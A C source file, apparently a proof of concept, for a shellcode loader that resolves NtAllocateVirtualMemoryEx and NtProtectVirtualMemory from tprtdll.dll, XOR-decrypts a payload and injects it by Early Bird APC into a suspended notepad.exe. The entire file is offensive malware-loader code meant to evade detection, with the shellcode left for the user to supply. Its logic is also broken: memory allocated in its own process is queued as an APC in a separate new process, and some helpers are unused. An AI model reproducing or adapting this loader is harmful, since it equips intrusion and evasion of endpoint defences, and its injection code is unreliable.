#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

/*

author @tlsbollei

This PoC demonstrates the use of tprtdll.dll to perform memory allocation and protection changes
tprtdll.dll is a legitimate Windows DLL that exports NtAllocateVirtualMemoryEx and NtProtectVirtualMemory functions, all of which we prototype and use here
Here we use Early Bird APC injection to execute the shellcode in a suspended process
Feel free to choose any other process injection technique. The main point of this PoC is to demonstrate the use of tprtdll.dll and its functions.

original author behind tprtdll.dll: @whokilleddb 
Huge props to this guy! Rewrote his PoC with added functionality. 

*/
unsigned char encrypted_shellcode[] = { 
    /* assemble your own shellcode, loser */
};
size_t encrypted_shellcode_size = sizeof(encrypted_shellcode);

typedef NTSTATUS(NTAPI* PNtAllocateVirtualMemoryEx)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG PageProtection,
    PMEM_EXTENDED_PARAMETER ExtendedParameters,
    ULONG ExtendedParameterCount);

typedef NTSTATUS(NTAPI* PNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection);

typedef NTSTATUS(NTAPI* PNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PPS_ATTRIBUTE_LIST AttributeList);

// placeholder only, real implants would have a much more complex decryption/encryption scheme and routine rather than a simple XOR
void xor_decrypt(unsigned char* data, size_t data_len, unsigned char key) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key;
    }
}
DWORD GetProcessIdByName(const wchar_t* processName) {
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    if (!Process32FirstW(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }
    do {
        if (wcscmp(pe32.szExeFile, processName) == 0) {
            CloseHandle(hSnapshot);
            return pe32.th32ProcessID;
        }
    } while (Process32NextW(hSnapshot, &pe32));
    
    CloseHandle(hSnapshot);
    return 0;
}

BOOL EarlyBirdAPCInjection(HANDLE hProcess, PVOID shellcodeAddress) {
    STARTUPINFOEXW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    wchar_t cmdLine[] = L"notepad.exe"; // choose something else for your sanity
    
    if (!CreateProcessW(
        NULL, cmdLine, NULL, NULL, FALSE, 
        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, 
        NULL, NULL, &si.StartupInfo, &pi)) {
        return FALSE;
    }
        if (!QueueUserAPC((PAPCFUNC)shellcodeAddress, pi.hThread, (ULONG_PTR)NULL)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }
    ResumeThread(pi.hThread);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return TRUE;
}

int main() {
    const unsigned char xor_key = 0xAA;
    HMODULE hHandle = NULL;
    
    // try to see if already loaded in memory
    hHandle = GetModuleHandleW(L"tprtdll.dll");
    if (hHandle == NULL) {
        // if not load using DONT_RESOLVE_DLL_REFERENCES to avoid loading dependencies
        hHandle = LoadLibraryExW(L"tprtdll.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
        if (hHandle == NULL) {
            // fallback to classic, risky
            hHandle = LoadLibraryW(L"tprtdll.dll");
            if (hHandle == NULL) {
                return -1;
            }
        }
    }   
    
    PNtAllocateVirtualMemoryEx NtAllocateVirtualMemoryEx = 
        (PNtAllocateVirtualMemoryEx)GetProcAddress(hHandle, "NtAllocateVirtualMemoryEx");
    PNtProtectVirtualMemory NtProtectVirtualMemory = 
        (PNtProtectVirtualMemory)GetProcAddress(hHandle, "NtProtectVirtualMemory");
    
    if (NtAllocateVirtualMemoryEx == NULL || NtProtectVirtualMemory == NULL) {
        return -1;
    }
    
    LPVOID address = NULL;
    SIZE_T region_size = encrypted_shellcode_size;
    NTSTATUS status = NtAllocateVirtualMemoryEx(
        GetCurrentProcess(),
        &address,
        &region_size,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE,  // rw 
        NULL,
        0
    );
    
    if (status != 0) {
        return -1;
    }
    memcpy(address, encrypted_shellcode, encrypted_shellcode_size);
    xor_decrypt((unsigned char*)address, encrypted_shellcode_size, xor_key);
    ULONG old_protection;
    status = NtProtectVirtualMemory(
        GetCurrentProcess(),
        &address,
        &region_size,
        PAGE_EXECUTE_READ,  // rx 
        &old_protection
    );
    
    if (status != 0) {
        return -1;
    }
    
    if (!EarlyBirdAPCInjection(GetCurrentProcess(), address)) {
        return -1;
    }
    
    return 0;
}